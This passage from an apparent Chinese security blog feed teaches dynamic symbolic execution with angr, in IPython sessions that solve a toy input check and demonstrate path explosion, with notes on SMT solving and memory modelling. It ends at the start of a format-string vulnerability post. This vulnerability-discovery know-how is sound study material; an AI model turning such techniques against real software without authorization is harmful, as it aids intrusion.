class="line"></span><br><span class="line">In [<span class="number">3</span>]: p=angr.Project(<span class="string">&quot;do&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以得到各种各样的信息，比如入口地址</span></span><br><span class="line">In [<span class="number">4</span>]: hex(p.entry)</span><br><span class="line">Out[<span class="number">4</span>]: <span class="string">&#x27;0x401050&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: p.factory.block(<span class="number">0x401050</span>).pp()</span><br><span class="line">        _start:</span><br><span class="line"><span class="number">401050</span>  xor     ebp, ebp</span><br><span class="line"><span class="number">401052</span>  mov     r9, rdx</span><br><span class="line"><span class="number">401055</span>  pop     rsi</span><br><span class="line"><span class="number">401056</span>  mov     rdx, rsp</span><br><span class="line"><span class="number">401059</span>  and     rsp, <span class="number">0xfffffffffffffff0</span></span><br><span class="line"><span class="number">40105</span>d  push    rax</span><br><span class="line"><span class="number">40105</span>e  push    rsp</span><br><span class="line"><span class="number">40105f</span>  xor     r8d, r8d</span><br><span class="line"><span class="number">401062</span>  xor     ecx, ecx</span><br><span class="line"><span class="number">401064</span>  mov     rdi, main</span><br><span class="line"><span class="number">40106b</span>  call    qword ptr [<span class="number">0x403fd8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//现在来用它做一个模拟器，它从一个激活状态开始</span></span><br><span class="line">In [<span class="number">6</span>]: sm=p.factory.simulation_manager()</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: sm.active</span><br><span class="line">Out[<span class="number">7</span>]: [&lt;SimState @ <span class="number">0x401050</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: sm.active[<span class="number">0</span>]</span><br><span class="line">Out[<span class="number">8</span>]: &lt;SimState @ <span class="number">0x401050</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个状态有寄存器之类的东西，这些是寄存器的初始值</span></span><br><span class="line">In [<span class="number">9</span>]: sm.active[<span class="number">0</span>].regs</span><br><span class="line">Out[<span class="number">9</span>]: &lt;angr.state_plugins.view.SimRegNameView at <span class="number">0x7fa4c530f190</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: sm.active[<span class="number">0</span>].regs.rax</span><br><span class="line">Out[<span class="number">10</span>]: &lt;BV64 <span class="number">0x1c</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: sm.active[<span class="number">0</span>].regs.rsp</span><br><span class="line">Out[<span class="number">11</span>]: &lt;BV64 <span class="number">0x7fffffffffeff98</span>&gt;</span><br><span class="line"><span class="comment">//还有内存，比如我们加载elf的基址，加载4字节</span></span><br><span class="line">In [<span class="number">12</span>]: sm.active[<span class="number">0</span>].memory.load(<span class="number">0x400000</span>,<span class="number">4</span>)</span><br><span class="line">Out[<span class="number">12</span>]: &lt;BV32 <span class="number">0x7f454c46</span>&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: <span class="string">&quot;\x7f\x45\x4c\x46&quot;</span></span><br><span class="line">Out[<span class="number">13</span>]: <span class="string">&#x27;\x7fELF&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在来看执行，模拟程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">14</span>]: sm.step()</span><br><span class="line">Out[<span class="number">14</span>]: &lt;SimulationManager with <span class="number">1</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: sm.step()</span><br><span class="line">Out[<span class="number">15</span>]: &lt;SimulationManager with <span class="number">1</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: sm.step()</span><br><span class="line">Out[<span class="number">16</span>]: &lt;SimulationManager with <span class="number">1</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: sm.step()</span><br><span class="line">Out[<span class="number">17</span>]: &lt;SimulationManager with <span class="number">1</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: sm.step()</span><br><span class="line">Out[<span class="number">18</span>]: &lt;SimulationManager with <span class="number">1</span> active&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到之前的状态，它在执行过程中走过的路径</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">19</span>]: <span class="built_in">list</span>(sm.active[<span class="number">0</span>].history.descriptions)</span><br><span class="line">Out[<span class="number">19</span>]: </span><br><span class="line">[<span class="string">&#x27;&lt;IRSB from 0x401050: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;SimProcedure __libc_start_main from 0x527cc0: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x401136: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x401040: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;SimProcedure read from 0x5fea10: 1 sat&gt;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>继续尝试步进，这次使用函数来步进</p><blockquote><p>这条指令让符号执行开始运行，并在<strong>活动路径数量超过 1</strong> 时停止。换句话说，符号执行会继续探索路径，直到程序出现了多个可能的执行路径。这通常用于查找分支点或分析程序中不同输入条件引起的执行分歧。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: sm.run(until=lambda sm2 :len(sm.active) &gt;<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">20</span>]: &lt;SimulationManager with <span class="number">2</span> active&gt;</span><br></pre></td></tr></table></figure><p>来看看发生了什么，这是2者的执行路径，它们最后执行的都是 <code>&#39;&lt;IRSB from 0x40115f: 2 sat&gt;&#39;]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">21</span>]: <span class="built_in">list</span>(sm.active[<span class="number">0</span>].history.descriptions)</span><br><span class="line">Out[<span class="number">21</span>]: </span><br><span class="line">[<span class="string">&#x27;&lt;IRSB from 0x401050: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;SimProcedure __libc_start_main from 0x527cc0: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x401136: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x401040: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;SimProcedure read from 0x5fea10: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x40115f: 2 sat&gt;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: <span class="built_in">list</span>(sm.active[<span class="number">1</span>].history.descriptions)</span><br><span class="line">Out[<span class="number">22</span>]: </span><br><span class="line">[<span class="string">&#x27;&lt;IRSB from 0x401050: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;SimProcedure __libc_start_main from 0x527cc0: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x401136: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x401040: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;SimProcedure read from 0x5fea10: 1 sat&gt;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&lt;IRSB from 0x40115f: 2 sat&gt;&#x27;</span>]</span><br></pre></td></tr></table></figure><p>查看产生分支的地方，这里就是cmp比较区域，也是一开始程序要点处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">23</span>]: p.factory.block(<span class="number">0x40115f</span>).pp()</span><br><span class="line"><span class="number">40115f</span>  movzx   eax, byte ptr [rbp<span class="number">-0x400</span>]</span><br><span class="line"><span class="number">401166</span>  cmp     al, <span class="number">0x2a</span></span><br><span class="line"><span class="number">401168</span>  jne     <span class="number">0x40117b</span></span><br></pre></td></tr></table></figure><p>可以来看这两个模拟器的状态，到底是产生了什么分歧。可以看到是“约束条件”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">24</span>]: sm.active[<span class="number">0</span>].solver.constraints</span><br><span class="line">Out[<span class="number">24</span>]: [&lt;Bool packet_0_stdin_55_8 == <span class="number">42</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: sm.active[<span class="number">1</span>].solver.constraints</span><br><span class="line">Out[<span class="number">25</span>]: [&lt;Bool packet_0_stdin_55_8 != <span class="number">42</span>&gt;]</span><br></pre></td></tr></table></figure><p>现在来看看“运行”会是怎样，成功运行并找到了分歧。但这是一个非常简单的程序，所以可以运行完并有结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">26</span>]: sm.run()</span><br><span class="line">Out[<span class="number">26</span>]: &lt;SimulationManager with <span class="number">2</span> deadended&gt;</span><br></pre></td></tr></table></figure><p>可以看一下现在的约束条件,还是42</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意，运行结束了，它们不再是activate，而是deadended</span></span><br><span class="line">In [<span class="number">27</span>]: sm.active[<span class="number">1</span>].solver.constraints</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">IndexError                                <span class="title function_">Traceback</span> <span class="params">(most recent call last)</span></span><br><span class="line">Cell In[27], line 1</span><br><span class="line">----&gt; 1 sm.active[1].solver.constraints</span><br><span class="line"></span><br><span class="line">IndexError: <span class="built_in">list</span> index out of range</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [28]: sm.deadended[1].solver.constraints</span><br><span class="line">Out[28]: [&lt;Bool packet_0_stdin_55_8 == <span class="number">42</span>&gt;]</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: sm.deadended[<span class="number">0</span>].solver.constraints</span><br><span class="line">Out[<span class="number">29</span>]: [&lt;Bool packet_0_stdin_55_8 != <span class="number">42</span>&gt;]</span><br></pre></td></tr></table></figure><p>还可以看看他们的标准输出（可以称为“具体化”，具体化是查询约束求解器的过程）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">30</span>]: sm.deadended[<span class="number">0</span>].posix.<span class="built_in">stdout</span>.concretize()</span><br><span class="line">Out[<span class="number">30</span>]: [b<span class="number">&#x27;F</span>ailure!<span class="string">&#x27;, b&#x27;</span>\n<span class="number">&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">31</span>]: sm.deadended[<span class="number">1</span>].posix.<span class="built_in">stdout</span>.concretize()</span><br><span class="line">Out[<span class="number">31</span>]: [b<span class="number">&#x27;</span>Success!<span class="string">&#x27;, b&#x27;</span>\n<span class="number">&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以利用这个计算出标准输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">32</span>]: sm.deadended[<span class="number">1</span>].posix.<span class="built_in">stdin</span>.concretize()</span><br><span class="line">Out[<span class="number">32</span>]: [b<span class="number">&#x27;</span>*<span class="string">&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h2><p>看起来很完美，但是符号执行有严重的限制：它必须追踪每一条路径来理解正在发生的事情</p><h3 id="路径爆炸"><a href="#路径爆炸" class="headerlink" title="路径爆炸"></a>路径爆炸</h3><p>比如此代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">atoi</span><span class="params">(<span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*s != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*s == <span class="string">&#x27;0&#x27;</span>) n = n * <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;1&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;2&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;3&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;4&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;5&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;6&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;7&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;8&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*s == <span class="string">&#x27;9&#x27;</span>) n = n * <span class="number">10</span> + <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    read(<span class="number">0</span>, buffer, <span class="number">10</span>); </span><br><span class="line">    <span class="type">int</span> i = atoi(buffer); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">42</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failure!&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 添加返回语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个状态都会再分出10个不同的状态，最终会导致状态爆炸，这就是符号执行不可行的首要原因，它会遍历每一条路径，面对复杂流程的代码就先一步卡在了路径遍历上。</p><p>现在执行此代码，来看到实时的状态爆炸</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: import angr</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: p=angr.Project(<span class="string">&quot;atoi&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: sm=p.factory.simulation_manager()</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: sm.run(until=lamnda sm2 :len(sm.active)&gt;<span class="number">1</span>)</span><br><span class="line">  Cell In[<span class="number">4</span>], line <span class="number">1</span></span><br><span class="line">    sm.run(until=lamnda sm2 :len(sm.active)&gt;<span class="number">1</span>)</span><br><span class="line">                 ^</span><br><span class="line">SyntaxError: invalid syntax. Perhaps you forgot a comma?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: sm.run(until=lambda sm2 :len(sm.active)&gt;<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">5</span>]: &lt;SimulationManager with <span class="number">2</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: sm.step()</span><br><span class="line">Out[<span class="number">6</span>]: &lt;SimulationManager with <span class="number">3</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: sm.step()</span><br><span class="line">Out[<span class="number">7</span>]: &lt;SimulationManager with <span class="number">4</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: sm.step()</span><br><span class="line">Out[<span class="number">8</span>]: &lt;SimulationManager with <span class="number">6</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: sm.step()</span><br><span class="line">Out[<span class="number">9</span>]: &lt;SimulationManager with <span class="number">9</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: sm.step()</span><br><span class="line">Out[<span class="number">10</span>]: &lt;SimulationManager with <span class="number">13</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: sm.step()</span><br><span class="line">Out[<span class="number">11</span>]: &lt;SimulationManager with <span class="number">19</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: sm.step()</span><br><span class="line">Out[<span class="number">12</span>]: &lt;SimulationManager with <span class="number">28</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: sm.step()</span><br><span class="line">Out[<span class="number">13</span>]: &lt;SimulationManager with <span class="number">41</span> active&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: sm.step()</span><br><span class="line">Out[<span class="number">14</span>]: &lt;SimulationManager with <span class="number">59</span> active, <span class="number">1</span> deadended&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: sm.deadended[<span class="number">0</span>].posix.<span class="built_in">stdin</span>.concretizer()</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">Cell In[<span class="number">15</span>], line <span class="number">1</span></span><br><span class="line">----&gt; <span class="number">1</span> sm.deadended[<span class="number">0</span>].posix.<span class="built_in">stdin</span>.concretizer()</span><br><span class="line"></span><br><span class="line">AttributeError: <span class="string">&#x27;SimPacketsStream&#x27;</span> object has no attribute <span class="string">&#x27;concretizer&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: sm.deadended[<span class="number">0</span>].posix.<span class="built_in">stdin</span>.concretize()</span><br><span class="line">Out[<span class="number">16</span>]: [b<span class="number">&#x27;</span>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<span class="number">&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是第一个结束状态，得到的都是空字节，继续步进，会发现需要的时间越来愈长</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: sm.step()</span><br><span class="line">Out[<span class="number">17</span>]: &lt;SimulationManager with <span class="number">87</span> active, <span class="number">1</span> deadended&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: sm.step()</span><br><span class="line">Out[<span class="number">18</span>]: &lt;SimulationManager with <span class="number">128</span> active, <span class="number">1</span> deadended&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: sm.step()</span><br><span class="line">Out[<span class="number">19</span>]: &lt;SimulationManager with <span class="number">186</span> active, <span class="number">2</span> deadended&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: sm.deadended[<span class="number">0</span>].posix.<span class="built_in">stdin</span>.concretize()</span><br><span class="line">Out[<span class="number">20</span>]: [b<span class="number">&#x27;</span>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<span class="number">&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: sm.deadended[<span class="number">1</span>].posix.<span class="built_in">stdin</span>.concretize()</span><br><span class="line">Out[<span class="number">21</span>]: [b<span class="number">&#x27;0</span>\x00\x00\x00\x00\x00\x00\x00\x00\x00<span class="number">&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: sm.step()</span><br><span class="line">Out[<span class="number">22</span>]: &lt;SimulationManager with <span class="number">271</span> active, <span class="number">3</span> deadended&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: sm.deadended[<span class="number">2</span>].posix.<span class="built_in">stdin</span>.concretize()</span><br><span class="line">Out[<span class="number">23</span>]: [b<span class="number">&#x27;1</span>\x00\x00\x00\x00\x00\x00\x00\x00\x00<span class="number">&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以得到数字0，1，但这些离42还有很远,而且越到后面路径越多</p><h3 id="如何解决？"><a href="#如何解决？" class="headerlink" title="如何解决？"></a>如何解决？</h3><p>可以使用一些技术合并状态，使用复杂的数学公式，将多种状态合并成一种</p><p>但也有可能得到越来越复杂的数学公式</p><p>约束一般使用 SMT解答器来解答，可满足性模块化理论</p><p>SMT的基本思想是：理论本质上编码了不同类型的简化结果，将一些常见的情况套用那些化简，然后不断地用那些理论简化结果，用逻辑表达式构建一个模型，它表示实际涉及的比特，即使这些比特是未知的，然后通过布尔可满足性（SAT）原理解决问题，SAT是一个NP完全解决的问题<a class="link"   href="https://en.wikipedia.org/wiki/Boolean_satisfiability_problem" >https://en.wikipedia.org/wiki/Boolean_satisfiability_problem<i class="fas fa-external-link-alt"></i></a></p><p>这意味着我们没有一个多项式时间的算法来解决这个问题，求解SAT模型的算法是指数型的，所以解决复杂的程序会很慢</p><p>当面对复杂数据，复杂操作时，符号执行会失败，不只是路径爆炸的问题，也由于约束求解的局限性</p><h3 id="环境建模"><a href="#环境建模" class="headerlink" title="环境建模"></a>环境建模</h3><p>模拟CPU：相对简单</p><p>模拟OS：难</p><ul><li><p>符号执行引擎必须识别各种内存错误（如缓冲区溢出、空指针解引用），这需要精确地跟踪内存块的边界、访问权限等信息。内存模拟中出现的错误检测约束，会进一步增加符号执行的复杂性。</p></li><li><p>动态符号执行中需要模拟对指针、数组、结构体等复杂数据结构的访问。这些结构通常涉及多级指针和嵌套的内存引用，导致在执行过程中需要频繁地进行地址计算和内存对象查找。例如，访问链表、树等数据结构时，指针的符号化会导致路径爆炸，增加符号执行的开销。如何准确地追踪指针的指向并处理其符号化表达式，是内存模拟中的一大挑战</p></li><li><p>在符号执行中，程序中的变量、地址、数组索引等都可能被符号化，从而表示为一组符号变量，而非具体值。这样一来，内存地址本身也可能是符号化的，这意味着一个内存访问操作（如读、写）可能对应多个潜在的内存位置。当使用符号化地址进行内存访问时，符号执行引擎必须考虑所有可能的地址，并在模拟内存时维护这些可能性。这极大地增加了内存访问的复杂性和计算成本</p></li><li><p>动态符号执行在探索程序路径时，需要不断克隆内存状态，以探索不同的执行分支。每当程序执行一条条件分支指令，符号执行引擎就会创建两个新的状态，并且需要分别模拟它们的内存操作。这会导致大量的内存复制和状态克隆操作。</p></li><li><p>符号执行引擎通常使用一种<strong>分层表示</strong>的方法来共享内存对象。然而，这种优化需要精确地管理哪些对象被共享，哪些对象需要克隆，且要确保在不同执行路径上的内存操作不会互相干扰</p></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>pwn.college Module 12 - Automated Vulnerability Discovery - Dynamic Symbolic Execution</p><p><a class="link"   href="https://www.diag.uniroma1.it/~delia/papers/svtr19.pdf" >https://www.diag.uniroma1.it/~delia/papers/svtr19.pdf<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://srg.doc.ic.ac.uk/files/papers/ngmem-ase-2019.pdf" >https://srg.doc.ic.ac.uk/files/papers/ngmem-ase-2019.pdf<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;初始概念介绍&quot;&gt;&lt;a href=&quot;#初始概念介绍&quot; class=&quot;headerlink&quot; title=&quot;初始概念介绍&quot;&gt;&lt;/a&gt;初始概念介绍&lt;/h2&gt;&lt;p&gt;动态符号执行的核心思想是在所谓的符号数据域上模拟程序执行&lt;/p&gt;
&lt;p&gt;cpu工作在1和0上，如果使用rea</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="http://arch3rn4r.github.io/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://arch3rn4r.github.io/2024/09/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-09-16T13:07:42.000Z</published>
    <updated>2025-05-02T02:41:59.437Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先来看printf,这是常用的格式化字符串函数，以下是常见用法，能利用%s,%d等来替换不同的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s!\n&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;There are %d lights!&quot;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The average of %d, %d, and %d is %f&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="type">float</span>(<span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>)/<span 